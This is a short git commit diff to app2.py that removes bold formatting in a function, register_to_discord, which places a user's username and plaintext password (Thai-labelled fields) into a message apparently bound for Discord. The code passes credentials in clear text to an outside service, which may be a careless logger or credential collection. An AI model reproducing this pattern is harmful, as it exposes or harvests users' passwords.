74a3d8e8056e1b25fb4b60df6ca42e5f2d98df7e
earthkcc147 <145793741+earthkcc147@users.noreply.github.com>
2025-01-23 11:29:47 +0700

    Update app2.py

--- app2.py
+++ app2.py
@@ -90,12 +90,12 @@ def register_to_discord(username, password):
                 "fields": [
                     {
                         "name": "ชื่อผู้ใช้",
-                        "value": f"**{username}**",
+                        "value": username,
                         "inline": False
                     },
                     {
                         "name": "รหัสผ่าน",
-                        "value": f"**{password}**",
+                        "value": password,
                         "inline": False
                     }
                 ],
